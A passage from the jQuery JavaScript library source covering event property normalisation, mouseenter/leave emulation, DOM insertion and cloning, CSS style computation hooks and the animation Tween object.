      altKey: true,
      bubbles: true,
      cancelable: true,
      changedTouches: true,
      ctrlKey: true,
      detail: true,
      eventPhase: true,
      metaKey: true,
      pageX: true,
      pageY: true,
      shiftKey: true,
      view: true,
      "char": true,
      charCode: true,
      key: true,
      keyCode: true,
      button: true,
      buttons: true,
      clientX: true,
      clientY: true,
      offsetX: true,
      offsetY: true,
      pointerId: true,
      pointerType: true,
      screenX: true,
      screenY: true,
      targetTouches: true,
      toElement: true,
      touches: true,

      which: function( event ) {
          var button = event.button;

          // Add which for key events
          if ( event.which == null && rkeyEvent.test( event.type ) ) {
              return event.charCode != null ? event.charCode : event.keyCode;
          }

          // Add which for click: 1 === left; 2 === middle; 3 === right
          if ( !event.which && button !== undefined && rmouseEvent.test( event.type ) ) {
              if ( button & 1 ) {
                  return 1;
              }

              if ( button & 2 ) {
                  return 3;
              }

              if ( button & 4 ) {
                  return 2;
              }

              return 0;
          }

          return event.which;
      }
  }, jQuery.event.addProp );

  // Create mouseenter/leave events using mouseover/out and event-time checks
  // so that event delegation works in jQuery.
  // Do the same for pointerenter/pointerleave and pointerover/pointerout
  //
  // Support: Safari 7 only
  // Safari sends mouseenter too often; see:
  // https://bugs.chromium.org/p/chromium/issues/detail?id=470258
  // for the description of the bug (it existed in older Chrome versions as well).
  jQuery.each( {
      mouseenter: "mouseover",
      mouseleave: "mouseout",
      pointerenter: "pointerover",
      pointerleave: "pointerout"
  }, function( orig, fix ) {
      jQuery.event.special[ orig ] = {
          delegateType: fix,
          bindType: fix,

          handle: function( event ) {
              var ret,
                  target = this,
                  related = event.relatedTarget,
                  handleObj = event.handleObj;

              // For mouseenter/leave call the handler if related is outside the target.
              // NB: No relatedTarget if the mouse left/entered the browser window
              if ( !related || ( related !== target && !jQuery.contains( target, related ) ) ) {
                  event.type = handleObj.origType;
                  ret = handleObj.handler.apply( this, arguments );
                  event.type = fix;
              }
              return ret;
          }
      };
  } );

  jQuery.fn.extend( {

      on: function( types, selector, data, fn ) {
          return on( this, types, selector, data, fn );
      },
      one: function( types, selector, data, fn ) {
          return on( this, types, selector, data, fn, 1 );
      },
      off: function( types, selector, fn ) {
          var handleObj, type;
          if ( types && types.preventDefault && types.handleObj ) {

              // ( event )  dispatched jQuery.Event
              handleObj = types.handleObj;
              jQuery( types.delegateTarget ).off(
                  handleObj.namespace ?
                      handleObj.origType + "." + handleObj.namespace :
                      handleObj.origType,
                  handleObj.selector,
                  handleObj.handler
              );
              return this;
          }
          if ( typeof types === "object" ) {

              // ( types-object [, selector] )
              for ( type in types ) {
                  this.off( type, selector, types[ type ] );
              }
              return this;
          }
          if ( selector === false || typeof selector === "function" ) {

              // ( types [, fn] )
              fn = selector;
              selector = undefined;
          }
          if ( fn === false ) {
              fn = returnFalse;
          }
          return this.each( function() {
              jQuery.event.remove( this, types, fn, selector );
          } );
      }
  } );


  var

      /* eslint-disable max-len */

      // See https://github.com/eslint/eslint/issues/3229
      rxhtmlTag = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([a-z][^\/\0>\x20\t\r\n\f]*)[^>]*)\/>/gi,

      /* eslint-enable */

      // Support: IE <=10 - 11, Edge 12 - 13
      // In IE/Edge using regex groups here causes severe slowdowns.
      // See https://connect.microsoft.com/IE/feedback/details/1736512/
      rnoInnerhtml = /<script|<style|<link/i,

      // checked="checked" or checked
      rchecked = /checked\s*(?:[^=]|=\s*.checked.)/i,
      rscriptTypeMasked = /^true\/(.*)/,
      rcleanScript = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g;

  // Prefer a tbody over its parent table for containing new rows
  function manipulationTarget( elem, content ) {
      if ( nodeName( elem, "table" ) &&
          nodeName( content.nodeType !== 11 ? content : content.firstChild, "tr" ) ) {

          return jQuery( ">tbody", elem )[ 0 ] || elem;
      }

      return elem;
  }

  // Replace/restore the type attribute of script elements for safe DOM manipulation
  function disableScript( elem ) {
      elem.type = ( elem.getAttribute( "type" ) !== null ) + "/" + elem.type;
      return elem;
  }
  function restoreScript( elem ) {
      var match = rscriptTypeMasked.exec( elem.type );

      if ( match ) {
          elem.type = match[ 1 ];
      } else {
          elem.removeAttribute( "type" );
      }

      return elem;
  }

  function cloneCopyEvent( src, dest ) {
      var i, l, type, pdataOld, pdataCur, udataOld, udataCur, events;

      if ( dest.nodeType !== 1 ) {
          return;
      }

      // 1. Copy private data: events, handlers, etc.
      if ( dataPriv.hasData( src ) ) {
          pdataOld = dataPriv.access( src );
          pdataCur = dataPriv.set( dest, pdataOld );
          events = pdataOld.events;

          if ( events ) {
              delete pdataCur.handle;
              pdataCur.events = {};

              for ( type in events ) {
                  for ( i = 0, l = events[ type ].length; i < l; i++ ) {
                      jQuery.event.add( dest, type, events[ type ][ i ] );
                  }
              }
          }
      }

      // 2. Copy user data
      if ( dataUser.hasData( src ) ) {
          udataOld = dataUser.access( src );
          udataCur = jQuery.extend( {}, udataOld );

          dataUser.set( dest, udataCur );
      }
  }

  // Fix IE bugs, see support tests
  function fixInput( src, dest ) {
      var nodeName = dest.nodeName.toLowerCase();

      // Fails to persist the checked state of a cloned checkbox or radio button.
      if ( nodeName === "input" && rcheckableType.test( src.type ) ) {
          dest.checked = src.checked;

      // Fails to return the selected option to the default selected state when cloning options
      } else if ( nodeName === "input" || nodeName === "textarea" ) {
          dest.defaultValue = src.defaultValue;
      }
  }

  function domManip( collection, args, callback, ignored ) {

      // Flatten any nested arrays
      args = concat.apply( [], args );

      var fragment, first, scripts, hasScripts, node, doc,
          i = 0,
          l = collection.length,
          iNoClone = l - 1,
          value = args[ 0 ],
          isFunction = jQuery.isFunction( value );

      // We can't cloneNode fragments that contain checked, in WebKit
      if ( isFunction ||
              ( l > 1 && typeof value === "string" &&
                  !support.checkClone && rchecked.test( value ) ) ) {
          return collection.each( function( index ) {
              var self = collection.eq( index );
              if ( isFunction ) {
                  args[ 0 ] = value.call( this, index, self.html() );
              }
              domManip( self, args, callback, ignored );
          } );
      }

      if ( l ) {
          fragment = buildFragment( args, collection[ 0 ].ownerDocument, false, collection, ignored );
          first = fragment.firstChild;

          if ( fragment.childNodes.length === 1 ) {
              fragment = first;
          }

          // Require either new content or an interest in ignored elements to invoke the callback
          if ( first || ignored ) {
              scripts = jQuery.map( getAll( fragment, "script" ), disableScript );
              hasScripts = scripts.length;

              // Use the original fragment for the last item
              // instead of the first because it can end up
              // being emptied incorrectly in certain situations (#8070).
              for ( ; i < l; i++ ) {
                  node = fragment;

                  if ( i !== iNoClone ) {
                      node = jQuery.clone( node, true, true );

                      // Keep references to cloned scripts for later restoration
                      if ( hasScripts ) {

                          // Support: Android <=4.0 only, PhantomJS 1 only
                          // push.apply(_, arraylike) throws on ancient WebKit
                          jQuery.merge( scripts, getAll( node, "script" ) );
                      }
                  }

                  callback.call( collection[ i ], node, i );
              }

              if ( hasScripts ) {
                  doc = scripts[ scripts.length - 1 ].ownerDocument;

                  // Reenable scripts
                  jQuery.map( scripts, restoreScript );

                  // Evaluate executable scripts on first document insertion
                  for ( i = 0; i < hasScripts; i++ ) {
                      node = scripts[ i ];
                      if ( rscriptType.test( node.type || "" ) &&
                          !dataPriv.access( node, "globalEval" ) &&
                          jQuery.contains( doc, node ) ) {

                          if ( node.src ) {

                              // Optional AJAX dependency, but won't run scripts if not present
                              if ( jQuery._evalUrl ) {
                                  jQuery._evalUrl( node.src );
                              }
                          } else {
                              DOMEval( node.textContent.replace( rcleanScript, "" ), doc );
                          }
                      }
                  }
              }
          }
      }

      return collection;
  }

  function remove( elem, selector, keepData ) {
      var node,
          nodes = selector ? jQuery.filter( selector, elem ) : elem,
          i = 0;

      for ( ; ( node = nodes[ i ] ) != null; i++ ) {
          if ( !keepData && node.nodeType === 1 ) {
              jQuery.cleanData( getAll( node ) );
          }

          if ( node.parentNode ) {
              if ( keepData && jQuery.contains( node.ownerDocument, node ) ) {
                  setGlobalEval( getAll( node, "script" ) );
              }
              node.parentNode.removeChild( node );
          }
      }

      return elem;
  }

  jQuery.extend( {
      htmlPrefilter: function( html ) {
          return html.replace( rxhtmlTag, "<$1></$2>" );
      },

      clone: function( elem, dataAndEvents, deepDataAndEvents ) {
          var i, l, srcElements, destElements,
              clone = elem.cloneNode( true ),
              inPage = jQuery.contains( elem.ownerDocument, elem );

          // Fix IE cloning issues
          if ( !support.noCloneChecked && ( elem.nodeType === 1 || elem.nodeType === 11 ) &&
                  !jQuery.isXMLDoc( elem ) ) {

              // We eschew Sizzle here for performance reasons: https://jsperf.com/getall-vs-sizzle/2
              destElements = getAll( clone );
              srcElements = getAll( elem );

              for ( i = 0, l = srcElements.length; i < l; i++ ) {
                  fixInput( srcElements[ i ], destElements[ i ] );
              }
          }

          // Copy the events from the original to the clone
          if ( dataAndEvents ) {
              if ( deepDataAndEvents ) {
                  srcElements = srcElements || getAll( elem );
                  destElements = destElements || getAll( clone );

                  for ( i = 0, l = srcElements.length; i < l; i++ ) {
                      cloneCopyEvent( srcElements[ i ], destElements[ i ] );
                  }
              } else {
                  cloneCopyEvent( elem, clone );
              }
          }

          // Preserve script evaluation history
          destElements = getAll( clone, "script" );
          if ( destElements.length > 0 ) {
              setGlobalEval( destElements, !inPage && getAll( elem, "script" ) );
          }

          // Return the cloned set
          return clone;
      },

      cleanData: function( elems ) {
          var data, elem, type,
              special = jQuery.event.special,
              i = 0;

          for ( ; ( elem = elems[ i ] ) !== undefined; i++ ) {
              if ( acceptData( elem ) ) {
                  if ( ( data = elem[ dataPriv.expando ] ) ) {
                      if ( data.events ) {
                          for ( type in data.events ) {
                              if ( special[ type ] ) {
                                  jQuery.event.remove( elem, type );

                              // This is a shortcut to avoid jQuery.event.remove's overhead
                              } else {
                                  jQuery.removeEvent( elem, type, data.handle );
                              }
                          }
                      }

                      // Support: Chrome <=35 - 45+
                      // Assign undefined instead of using delete, see Data#remove
                      elem[ dataPriv.expando ] = undefined;
                  }
                  if ( elem[ dataUser.expando ] ) {

                      // Support: Chrome <=35 - 45+
                      // Assign undefined instead of using delete, see Data#remove
                      elem[ dataUser.expando ] = undefined;
                  }
              }
          }
      }
  } );

  jQuery.fn.extend( {
      detach: function( selector ) {
          return remove( this, selector, true );
      },

      remove: function( selector ) {
          return remove( this, selector );
      },

      text: function( value ) {
          return access( this, function( value ) {
              return value === undefined ?
                  jQuery.text( this ) :
                  this.empty().each( function() {
                      if ( this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9 ) {
                          this.textContent = value;
                      }
                  } );
          }, null, value, arguments.length );
      },

      append: function() {
          return domManip( this, arguments, function( elem ) {
              if ( this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9 ) {
                  var target = manipulationTarget( this, elem );
                  target.appendChild( elem );
              }
          } );
      },

      prepend: function() {
          return domManip( this, arguments, function( elem ) {
              if ( this.nodeType === 1 || this.nodeType === 11 || this.nodeType === 9 ) {
                  var target = manipulationTarget( this, elem );
                  target.insertBefore( elem, target.firstChild );
              }
          } );
      },

      before: function() {
          return domManip( this, arguments, function( elem ) {
              if ( this.parentNode ) {
                  this.parentNode.insertBefore( elem, this );
              }
          } );
      },

      after: function() {
          return domManip( this, arguments, function( elem ) {
              if ( this.parentNode ) {
                  this.parentNode.insertBefore( elem, this.nextSibling );
              }
          } );
      },

      empty: function() {
          var elem,
              i = 0;

          for ( ; ( elem = this[ i ] ) != null; i++ ) {
              if ( elem.nodeType === 1 ) {

                  // Prevent memory leaks
                  jQuery.cleanData( getAll( elem, false ) );

                  // Remove any remaining nodes
                  elem.textContent = "";
              }
          }

          return this;
      },

      clone: function( dataAndEvents, deepDataAndEvents ) {
          dataAndEvents = dataAndEvents == null ? false : dataAndEvents;
          deepDataAndEvents = deepDataAndEvents == null ? dataAndEvents : deepDataAndEvents;

          return this.map( function() {
              return jQuery.clone( this, dataAndEvents, deepDataAndEvents );
          } );
      },

      html: function( value ) {
          return access( this, function( value ) {
              var elem = this[ 0 ] || {},
                  i = 0,
                  l = this.length;

              if ( value === undefined && elem.nodeType === 1 ) {
                  return elem.innerHTML;
              }

              // See if we can take a shortcut and just use innerHTML
              if ( typeof value === "string" && !rnoInnerhtml.test( value ) &&
                  !wrapMap[ ( rtagName.exec( value ) || [ "", "" ] )[ 1 ].toLowerCase() ] ) {

                  value = jQuery.htmlPrefilter( value );

                  try {
                      for ( ; i < l; i++ ) {
                          elem = this[ i ] || {};

                          // Remove element nodes and prevent memory leaks
                          if ( elem.nodeType === 1 ) {
                              jQuery.cleanData( getAll( elem, false ) );
                              elem.innerHTML = value;
                          }
                      }

                      elem = 0;

                  // If using innerHTML throws an exception, use the fallback method
                  } catch ( e ) {}
              }

              if ( elem ) {
                  this.empty().append( value );
              }
          }, null, value, arguments.length );
      },

      replaceWith: function() {
          var ignored = [];

          // Make the changes, replacing each non-ignored context element with the new content
          return domManip( this, arguments, function( elem ) {
              var parent = this.parentNode;

              if ( jQuery.inArray( this, ignored ) < 0 ) {
                  jQuery.cleanData( getAll( this ) );
                  if ( parent ) {
                      parent.replaceChild( elem, this );
                  }
              }

          // Force callback invocation
          }, ignored );
      }
  } );

  jQuery.each( {
      appendTo: "append",
      prependTo: "prepend",
      insertBefore: "before",
      insertAfter: "after",
      replaceAll: "replaceWith"
  }, function( name, original ) {
      jQuery.fn[ name ] = function( selector ) {
          var elems,
              ret = [],
              insert = jQuery( selector ),
              last = insert.length - 1,
              i = 0;

          for ( ; i <= last; i++ ) {
              elems = i === last ? this : this.clone( true );
              jQuery( insert[ i ] )[ original ]( elems );

              // Support: Android <=4.0 only, PhantomJS 1 only
              // .get() because push.apply(_, arraylike) throws on ancient WebKit
              push.apply( ret, elems.get() );
          }

          return this.pushStack( ret );
      };
  } );
  var rmargin = ( /^margin/ );

  var rnumnonpx = new RegExp( "^(" + pnum + ")(?!px)[a-z%]+$", "i" );

  var getStyles = function( elem ) {

          // Support: IE <=11 only, Firefox <=30 (#15098, #14150)
          // IE throws on elements created in popups
          // FF meanwhile throws on frame elements through "defaultView.getComputedStyle"
          var view = elem.ownerDocument.defaultView;

          if ( !view || !view.opener ) {
              view = window;
          }

          return view.getComputedStyle( elem );
      };



  ( function() {

      // Executing both pixelPosition & boxSizingReliable tests require only one layout
      // so they're executed at the same time to save the second computation.
      function computeStyleTests() {

          // This is a singleton, we need to execute it only once
          if ( !div ) {
              return;
          }

          div.style.cssText =
              "box-sizing:border-box;" +
              "position:relative;display:block;" +
              "margin:auto;border:1px;padding:1px;" +
              "top:1%;width:50%";
          div.innerHTML = "";
          documentElement.appendChild( container );

          var divStyle = window.getComputedStyle( div );
          pixelPositionVal = divStyle.top !== "1%";

          // Support: Android 4.0 - 4.3 only, Firefox <=3 - 44
          reliableMarginLeftVal = divStyle.marginLeft === "2px";
          boxSizingReliableVal = divStyle.width === "4px";

          // Support: Android 4.0 - 4.3 only
          // Some styles come back with percentage values, even though they shouldn't
          div.style.marginRight = "50%";
          pixelMarginRightVal = divStyle.marginRight === "4px";

          documentElement.removeChild( container );

          // Nullify the div so it wouldn't be stored in the memory and
          // it will also be a sign that checks already performed
          div = null;
      }

      var pixelPositionVal, boxSizingReliableVal, pixelMarginRightVal, reliableMarginLeftVal,
          container = document.createElement( "div" ),
          div = document.createElement( "div" );

      // Finish early in limited (non-browser) environments
      if ( !div.style ) {
          return;
      }

      // Support: IE <=9 - 11 only
      // Style of cloned element affects source element cloned (#8908)
      div.style.backgroundClip = "content-box";
      div.cloneNode( true ).style.backgroundClip = "";
      support.clearCloneStyle = div.style.backgroundClip === "content-box";

      container.style.cssText = "border:0;width:8px;height:0;top:0;left:-9999px;" +
          "padding:0;margin-top:1px;position:absolute";
      container.appendChild( div );

      jQuery.extend( support, {
          pixelPosition: function() {
              computeStyleTests();
              return pixelPositionVal;
          },
          boxSizingReliable: function() {
              computeStyleTests();
              return boxSizingReliableVal;
          },
          pixelMarginRight: function() {
              computeStyleTests();
              return pixelMarginRightVal;
          },
          reliableMarginLeft: function() {
              computeStyleTests();
              return reliableMarginLeftVal;
          }
      } );
  } )();


  function curCSS( elem, name, computed ) {
      var width, minWidth, maxWidth, ret,

          // Support: Firefox 51+
          // Retrieving style before computed somehow
          // fixes an issue with getting wrong values
          // on detached elements
          style = elem.style;

      computed = computed || getStyles( elem );

      // getPropertyValue is needed for:
      //   .css('filter') (IE 9 only, #12537)
      //   .css('--customProperty) (#3144)
      if ( computed ) {
          ret = computed.getPropertyValue( name ) || computed[ name ];

          if ( ret === "" && !jQuery.contains( elem.ownerDocument, elem ) ) {
              ret = jQuery.style( elem, name );
          }

          // A tribute to the "awesome hack by Dean Edwards"
          // Android Browser returns percentage for some values,
          // but width seems to be reliably pixels.
          // This is against the CSSOM draft spec:
          // https://drafts.csswg.org/cssom/#resolved-values
          if ( !support.pixelMarginRight() && rnumnonpx.test( ret ) && rmargin.test( name ) ) {

              // Remember the original values
              width = style.width;
              minWidth = style.minWidth;
              maxWidth = style.maxWidth;

              // Put in the new values to get a computed value out
              style.minWidth = style.maxWidth = style.width = ret;
              ret = computed.width;

              // Revert the changed values
              style.width = width;
              style.minWidth = minWidth;
              style.maxWidth = maxWidth;
          }
      }

      return ret !== undefined ?

          // Support: IE <=9 - 11 only
          // IE returns zIndex value as an integer.
          ret + "" :
          ret;
  }


  function addGetHookIf( conditionFn, hookFn ) {

      // Define the hook, we'll check on the first run if it's really needed.
      return {
          get: function() {
              if ( conditionFn() ) {

                  // Hook not needed (or it's not possible to use it due
                  // to missing dependency), remove it.
                  delete this.get;
                  return;
              }

              // Hook needed; redefine it so that the support test is not executed again.
              return ( this.get = hookFn ).apply( this, arguments );
          }
      };
  }


  var

      // Swappable if display is none or starts with table
      // except "table", "table-cell", or "table-caption"
      // See here for display values: https://developer.mozilla.org/en-US/docs/CSS/display
      rdisplayswap = /^(none|table(?!-c[ea]).+)/,
      rcustomProp = /^--/,
      cssShow = { position: "absolute", visibility: "hidden", display: "block" },
      cssNormalTransform = {
          letterSpacing: "0",
          fontWeight: "400"
      },

      cssPrefixes = [ "Webkit", "Moz", "ms" ],
      emptyStyle = document.createElement( "div" ).style;

  // Return a css property mapped to a potentially vendor prefixed property
  function vendorPropName( name ) {

      // Shortcut for names that are not vendor prefixed
      if ( name in emptyStyle ) {
          return name;
      }

      // Check for vendor prefixed names
      var capName = name[ 0 ].toUpperCase() + name.slice( 1 ),
          i = cssPrefixes.length;

      while ( i-- ) {
          name = cssPrefixes[ i ] + capName;
          if ( name in emptyStyle ) {
              return name;
          }
      }
  }

  // Return a property mapped along what jQuery.cssProps suggests or to
  // a vendor prefixed property.
  function finalPropName( name ) {
      var ret = jQuery.cssProps[ name ];
      if ( !ret ) {
          ret = jQuery.cssProps[ name ] = vendorPropName( name ) || name;
      }
      return ret;
  }

  function setPositiveNumber( elem, value, subtract ) {

      // Any relative (+/-) values have already been
      // normalized at this point
      var matches = rcssNum.exec( value );
      return matches ?

          // Guard against undefined "subtract", e.g., when used as in cssHooks
          Math.max( 0, matches[ 2 ] - ( subtract || 0 ) ) + ( matches[ 3 ] || "px" ) :
          value;
  }

  function augmentWidthOrHeight( elem, name, extra, isBorderBox, styles ) {
      var i,
          val = 0;

      // If we already have the right measurement, avoid augmentation
      if ( extra === ( isBorderBox ? "border" : "content" ) ) {
          i = 4;

      // Otherwise initialize for horizontal or vertical properties
      } else {
          i = name === "width" ? 1 : 0;
      }

      for ( ; i < 4; i += 2 ) {

          // Both box models exclude margin, so add it if we want it
          if ( extra === "margin" ) {
              val += jQuery.css( elem, extra + cssExpand[ i ], true, styles );
          }

          if ( isBorderBox ) {

              // border-box includes padding, so remove it if we want content
              if ( extra === "content" ) {
                  val -= jQuery.css( elem, "padding" + cssExpand[ i ], true, styles );
              }

              // At this point, extra isn't border nor margin, so remove border
              if ( extra !== "margin" ) {
                  val -= jQuery.css( elem, "border" + cssExpand[ i ] + "Width", true, styles );
              }
          } else {

              // At this point, extra isn't content, so add padding
              val += jQuery.css( elem, "padding" + cssExpand[ i ], true, styles );

              // At this point, extra isn't content nor padding, so add border
              if ( extra !== "padding" ) {
                  val += jQuery.css( elem, "border" + cssExpand[ i ] + "Width", true, styles );
              }
          }
      }

      return val;
  }

  function getWidthOrHeight( elem, name, extra ) {

      // Start with computed style
      var valueIsBorderBox,
          styles = getStyles( elem ),
          val = curCSS( elem, name, styles ),
          isBorderBox = jQuery.css( elem, "boxSizing", false, styles ) === "border-box";

      // Computed unit is not pixels. Stop here and return.
      if ( rnumnonpx.test( val ) ) {
          return val;
      }

      // Check for style in case a browser which returns unreliable values
      // for getComputedStyle silently falls back to the reliable elem.style
      valueIsBorderBox = isBorderBox &&
          ( support.boxSizingReliable() || val === elem.style[ name ] );

      // Fall back to offsetWidth/Height when value is "auto"
      // This happens for inline elements with no explicit setting (gh-3571)
      if ( val === "auto" ) {
          val = elem[ "offset" + name[ 0 ].toUpperCase() + name.slice( 1 ) ];
      }

      // Normalize "", auto, and prepare for extra
      val = parseFloat( val ) || 0;

      // Use the active box-sizing model to add/subtract irrelevant styles
      return ( val +
          augmentWidthOrHeight(
              elem,
              name,
              extra || ( isBorderBox ? "border" : "content" ),
              valueIsBorderBox,
              styles
          )
      ) + "px";
  }

  jQuery.extend( {

      // Add in style property hooks for overriding the default
      // behavior of getting and setting a style property
      cssHooks: {
          opacity: {
              get: function( elem, computed ) {
                  if ( computed ) {

                      // We should always get a number back from opacity
                      var ret = curCSS( elem, "opacity" );
                      return ret === "" ? "1" : ret;
                  }
              }
          }
      },

      // Don't automatically add "px" to these possibly-unitless properties
      cssNumber: {
          "animationIterationCount": true,
          "columnCount": true,
          "fillOpacity": true,
          "flexGrow": true,
          "flexShrink": true,
          "fontWeight": true,
          "lineHeight": true,
          "opacity": true,
          "order": true,
          "orphans": true,
          "widows": true,
          "zIndex": true,
          "zoom": true
      },

      // Add in properties whose names you wish to fix before
      // setting or getting the value
      cssProps: {
          "float": "cssFloat"
      },

      // Get and set the style property on a DOM Node
      style: function( elem, name, value, extra ) {

          // Don't set styles on text and comment nodes
          if ( !elem || elem.nodeType === 3 || elem.nodeType === 8 || !elem.style ) {
              return;
          }

          // Make sure that we're working with the right name
          var ret, type, hooks,
              origName = jQuery.camelCase( name ),
              isCustomProp = rcustomProp.test( name ),
              style = elem.style;

          // Make sure that we're working with the right name. We don't
          // want to query the value if it is a CSS custom property
          // since they are user-defined.
          if ( !isCustomProp ) {
              name = finalPropName( origName );
          }

          // Gets hook for the prefixed version, then unprefixed version
          hooks = jQuery.cssHooks[ name ] || jQuery.cssHooks[ origName ];

          // Check if we're setting a value
          if ( value !== undefined ) {
              type = typeof value;

              // Convert "+=" or "-=" to relative numbers (#7345)
              if ( type === "string" && ( ret = rcssNum.exec( value ) ) && ret[ 1 ] ) {
                  value = adjustCSS( elem, name, ret );

                  // Fixes bug #9237
                  type = "number";
              }

              // Make sure that null and NaN values aren't set (#7116)
              if ( value == null || value !== value ) {
                  return;
              }

              // If a number was passed in, add the unit (except for certain CSS properties)
              if ( type === "number" ) {
                  value += ret && ret[ 3 ] || ( jQuery.cssNumber[ origName ] ? "" : "px" );
              }

              // background-* props affect original clone's values
              if ( !support.clearCloneStyle && value === "" && name.indexOf( "background" ) === 0 ) {
                  style[ name ] = "inherit";
              }

              // If a hook was provided, use that value, otherwise just set the specified value
              if ( !hooks || !( "set" in hooks ) ||
                  ( value = hooks.set( elem, value, extra ) ) !== undefined ) {

                  if ( isCustomProp ) {
                      style.setProperty( name, value );
                  } else {
                      style[ name ] = value;
                  }
              }

          } else {

              // If a hook was provided get the non-computed value from there
              if ( hooks && "get" in hooks &&
                  ( ret = hooks.get( elem, false, extra ) ) !== undefined ) {

                  return ret;
              }

              // Otherwise just get the value from the style object
              return style[ name ];
          }
      },

      css: function( elem, name, extra, styles ) {
          var val, num, hooks,
              origName = jQuery.camelCase( name ),
              isCustomProp = rcustomProp.test( name );

          // Make sure that we're working with the right name. We don't
          // want to modify the value if it is a CSS custom property
          // since they are user-defined.
          if ( !isCustomProp ) {
              name = finalPropName( origName );
          }

          // Try prefixed name followed by the unprefixed name
          hooks = jQuery.cssHooks[ name ] || jQuery.cssHooks[ origName ];

          // If a hook was provided get the computed value from there
          if ( hooks && "get" in hooks ) {
              val = hooks.get( elem, true, extra );
          }

          // Otherwise, if a way to get the computed value exists, use that
          if ( val === undefined ) {
              val = curCSS( elem, name, styles );
          }

          // Convert "normal" to computed value
          if ( val === "normal" && name in cssNormalTransform ) {
              val = cssNormalTransform[ name ];
          }

          // Make numeric if forced or a qualifier was provided and val looks numeric
          if ( extra === "" || extra ) {
              num = parseFloat( val );
              return extra === true || isFinite( num ) ? num || 0 : val;
          }

          return val;
      }
  } );

  jQuery.each( [ "height", "width" ], function( i, name ) {
      jQuery.cssHooks[ name ] = {
          get: function( elem, computed, extra ) {
              if ( computed ) {

                  // Certain elements can have dimension info if we invisibly show them
                  // but it must have a current display style that would benefit
                  return rdisplayswap.test( jQuery.css( elem, "display" ) ) &&

                      // Support: Safari 8+
                      // Table columns in Safari have non-zero offsetWidth & zero
                      // getBoundingClientRect().width unless display is changed.
                      // Support: IE <=11 only
                      // Running getBoundingClientRect on a disconnected node
                      // in IE throws an error.
                      ( !elem.getClientRects().length || !elem.getBoundingClientRect().width ) ?
                          swap( elem, cssShow, function() {
                              return getWidthOrHeight( elem, name, extra );
                          } ) :
                          getWidthOrHeight( elem, name, extra );
              }
          },

          set: function( elem, value, extra ) {
              var matches,
                  styles = extra && getStyles( elem ),
                  subtract = extra && augmentWidthOrHeight(
                      elem,
                      name,
                      extra,
                      jQuery.css( elem, "boxSizing", false, styles ) === "border-box",
                      styles
                  );

              // Convert to pixels if value adjustment is needed
              if ( subtract && ( matches = rcssNum.exec( value ) ) &&
                  ( matches[ 3 ] || "px" ) !== "px" ) {

                  elem.style[ name ] = value;
                  value = jQuery.css( elem, name );
              }

              return setPositiveNumber( elem, value, subtract );
          }
      };
  } );

  jQuery.cssHooks.marginLeft = addGetHookIf( support.reliableMarginLeft,
      function( elem, computed ) {
          if ( computed ) {
              return ( parseFloat( curCSS( elem, "marginLeft" ) ) ||
                  elem.getBoundingClientRect().left -
                      swap( elem, { marginLeft: 0 }, function() {
                          return elem.getBoundingClientRect().left;
                      } )
                  ) + "px";
          }
      }
  );

  // These hooks are used by animate to expand properties
  jQuery.each( {
      margin: "",
      padding: "",
      border: "Width"
  }, function( prefix, suffix ) {
      jQuery.cssHooks[ prefix + suffix ] = {
          expand: function( value ) {
              var i = 0,
                  expanded = {},

                  // Assumes a single number if not a string
                  parts = typeof value === "string" ? value.split( " " ) : [ value ];

              for ( ; i < 4; i++ ) {
                  expanded[ prefix + cssExpand[ i ] + suffix ] =
                      parts[ i ] || parts[ i - 2 ] || parts[ 0 ];
              }

              return expanded;
          }
      };

      if ( !rmargin.test( prefix ) ) {
          jQuery.cssHooks[ prefix + suffix ].set = setPositiveNumber;
      }
  } );

  jQuery.fn.extend( {
      css: function( name, value ) {
          return access( this, function( elem, name, value ) {
              var styles, len,
                  map = {},
                  i = 0;

              if ( Array.isArray( name ) ) {
                  styles = getStyles( elem );
                  len = name.length;

                  for ( ; i < len; i++ ) {
                      map[ name[ i ] ] = jQuery.css( elem, name[ i ], false, styles );
                  }

                  return map;
              }

              return value !== undefined ?
                  jQuery.style( elem, name, value ) :
                  jQuery.css( elem, name );
          }, name, value, arguments.length > 1 );
      }
  } );


  function Tween( elem, options, prop, end, easing ) {
      return new Tween.prototype.init( elem, options, prop, end, easing );
  }
  jQuery.Tween = Tween;

  Tween.prototype = {
      constructor: Tween,
      init: function( elem, options, prop, end, easing, unit ) {
          this.elem = elem;
          this.prop = prop;
          this.easing = easing || jQuery.easing._default;
          this.options = options;
          this.start = this.now = this.cur();
          this.end = end;
          this.unit = unit || ( jQuery.cssNumber[ prop ] ? "" : "px" );
      },
      cur: function() {
          var hooks = Tween.propHooks[ this.prop ];

          return hooks && hooks.get ?
              hooks.get( this ) :
              Tween.propHooks._default.get( this );
      },
      run: function( percent ) {
          var eased,
              hooks = Tween.propHooks[ this.prop ];

          if ( this.options.duration ) {
              this.pos = eased = jQuery.easing[ this.easing ](
                  percent, this.options.duration * percent, 0, 1, this.options.duration
              );
          } else {
              this.pos = eased = percent;
          }
          this.now = ( this.end - this.start ) * eased + this.start;

          if ( this.options.step ) {
              this.options.step.call( this.elem, this.now, this );
          }

          if ( hooks && hooks.set ) {
              hooks.set( this );
          } else {
              Tween.propHooks._default.set( this );
          }
          return this;
      }
  };

  Tween.prototype.init.prototype = Tween.prototype;

  Tween.propHooks = {
      _default: {
          get: function( tween ) {
              var result;

              // Use a property on the element directly when it is not a DOM element,
              // or when there is no matching style property that exists.
              if ( tween.elem.nodeType !== 1 ||
                  tween.elem[ tween.prop ] != null && tween.elem.style[ tween.prop ] == null ) {
                  return tween.elem[ tween.prop ];
              }

              // Passing an empty string as a 3rd parameter to .css will automatically
              // attempt a parseFloat and fallback to a string if the parse fails.
              // Simple values such as "10px" are parsed to Float;
              // complex values such as "rotate(1rad)" are returned as-is.
              result = jQuery.css( tween.elem, tween.prop, "" );

              // Empty strings, null, undefined and "auto" are converted to 0.
              return !result || result === "auto" ? 0 : result;
          },
          set: function( tween ) {

              // Use step hook for back compat.
              // Use cssHook if its there.
              // Use .style if available and use plain properties where available.
              if ( jQuery.fx.step[ tween.prop ] ) {
                  jQuery.fx.step[ tween.prop ]( tween );
              } else if ( tween.elem.nodeType === 1 &&
                  ( tween.elem.style[ jQuery.cssProps[ tween.prop ] ] != null ||
                      jQuery.cssHooks[ tween.prop ] ) ) {
                  jQuery.style( tween.elem, tween.prop, tween.now + tween.unit );
              } else {
                  tween.elem[ tween.prop ] = tween.now;
              }
          }
      }
  };

  // Support: IE <=9 only
